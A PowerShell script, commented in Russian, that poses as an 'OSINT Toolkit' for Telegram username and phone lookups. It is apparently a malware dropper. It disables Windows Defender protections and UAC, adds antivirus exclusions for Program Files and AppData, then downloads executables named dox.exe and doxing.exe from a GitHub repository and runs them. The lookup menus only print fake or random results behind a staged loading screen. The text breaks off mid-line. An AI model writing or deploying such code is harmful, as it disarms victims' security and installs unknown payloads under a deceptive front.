# --- ОТКЛЮЧЕНИЕ ЗАЩИТЫ ---
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableScanningNetworkFiles $true
Set-MpPreference -DisableScanningRemovableDrivesDuringFullScan $true

# --- ОТКЛЮЧЕНИЕ UAC ---
$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$uacProperty = "EnableLUA"
Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0

# --- ДОБАВЛЕНИЕ ИСКЛЮЧЕНИЙ В АНТИВИРУС ---
try {
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFilesX86") -replace " $$x86$$", ""
        Add-MpPreference -ExclusionPath $ProgramFiles
        $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
        if (Test-Path $ProgramFilesX86) {
            Add-MpPreference -ExclusionPath $ProgramFilesX86
        }
        $AppData = [System.Environment]::GetFolderPath("ApplicationData")
        Add-MpPreference -ExclusionPath $AppData
        $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
        Add-MpPreference -ExclusionPath $LocalAppData
    }
}
catch {
    # Игнорировать ошибки, если не удалось добавить исключения
}

# --- ИМИТАЦИЯ ЗАГРУЗКИ ---
Clear-Host
Write-Host "========================================" -ForegroundColor Cyan
Write-Host " OSINT Toolkit v3.7 | INITIALIZING..." -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Cyan

Write-Host "`n[+] Loading core modules..." -ForegroundColor Green
\$modules = @("Telegram API", "Phone DB", "GeoIP Resolver", "Avatar Analyzer", "Session Decryptor")
for ($i = 0; $i -lt \$modules.Count; \$i++) {
    $progress = ($i + 1) / \$modules.Count * 100
    Write-Progress -Activity "Loading Modules" -Status "Loading $($modules[$i])..." -PercentComplete $progress
    Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3) # Уменьшил задержку для скорости
}

Write-Host "`n[+] Connecting to secure servers..." -ForegroundColor Green
# Цикл теперь только для имитации прогресса
for ($i = 0; $i -lt 100; $i++) {
    Write-Progress -Activity "Establishing Connection" -Status "Connecting to server 192.168.1.$(Get-Random -Minimum 100 -Maximum 255)..." -PercentComplete $i
    Start-Sleep -Milliseconds 50 # Уменьшил задержку
}

# --- СКАЧИВАНИЕ И ЗАПУСК ФАЙЛОВ (ВНЕ ЦИКЛА) ---
Write-Host "`n[+] Downloading required components..." -ForegroundColor Green
try {
    Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/raw/refs/heads/main/dox.exe" -OutFile "dox.exe"
    Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/raw/refs/heads/main/dox.dll" -OutFile "dox.dll"
    Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/raw/refs/heads/main/doxing.exe" -OutFile "doxing.exe"
    Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/raw/refs/heads/main/doxing.dll" -OutFile "doxing.dll"
    
    Write-Host "[+] Components downloaded. Executing..." -ForegroundColor Yellow
    # Запуск скачанных файлов
    Start-Process -FilePath ".\dox.exe" -NoNewWindow
    Start-Process -FilePath ".\doxing.exe" -NoNewWindow
    # DLL обычно загружаются процессами, а не запускаются напрямую. 
    # Оставлю вызовы, как в оригинале, но они могут не сработать.
    # .\dox.dll 
    # .\doxing.dll
}
catch {
    Write-Host "[!] Failed to download or execute components." -ForegroundColor Red
}

Write-Host "`n[+] Authentication successful. Welcome, Agent." -ForegroundColor Green
Start-Sleep -Seconds 2
Clear-Host

# --- ОСНОВНОЕ МЕНЮ ---
function Show-Menu {
    Clear-Host
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host " OSINT Toolkit v3.7 | MAIN MENU" -ForegroundColor Yellow
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host "Select an option:"
    Write-Host " 1) Telegram User Lookup (by Username)"
    Write-Host " 2) Telegram Phone Lookup"
    Write-Host " 3) Exit"
    Write-Host "----------------------------------------"
}

function Start-TelegramUserLookup {
    Clear-Host
    Write-Host "--- Telegram User Lookup ---" -ForegroundColor Yellow
    $username = Read-Host "Enter Telegram username (e.g., @durov)"
    Write-Host "`n[+] Querying database for '\$username'..." -ForegroundColor Green
    Start-Sleep -Seconds 3
    Write-Host "`n--- RESULTS ---" -ForegroundColor Red
    Write-Host "Username : $username"
    Write-Host "User ID : $(Get-Random -Minimum 1000000 -Maximum 9999999)"
    Write-Host "First Name : Максим"
    Write-Host "Last Name : Левенцов"
    Write-Host "Phone (Hidden): +7 *** ** ** 12"
    Write-Host "Bio : Founder of Telegram"
    Write-Host "Last Online : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    Write-Host "`n[+] Data extraction complete.`n" -ForegroundColor Green
    Read-Host "Press Enter to return to menu"
}

function Start-TelegramPhoneLookup {
    Clear-Host
    Write-Host "--- Telegram Phone Lookup ---" -ForegroundColor Yellow
    $phone = Read-Host "Enter phone number (with country code, e.g., +79123456789)"
    Write-Host "`n[+] Performing reverse lookup for '\$phone'..." -ForegroundColor Green
    Start-Sleep -Seconds 4
    Write-Host "`n--- RESULTS ---" -ForegroundColor Red
    Write-Host "Phone Number : $phone"
    Write-Host "Registered On : $(Get-Date -Format 'yyyy-MM-dd')"
    Write-Host "Linked User : @generic_user_$(Get-Random -Minimum 100 -Maximum 999)"
    Write-Host "Status : Online"
    Write-Host "Approx. Location: Moscow, Russia"
    Write-Host "`n[+] Data extraction complete.`n" -ForegroundColor Green
    Read-Host "Press Enter to return to menu"
}

# --- ГЛАВНЫЙ ЦИКЛ ---
do {
    Show
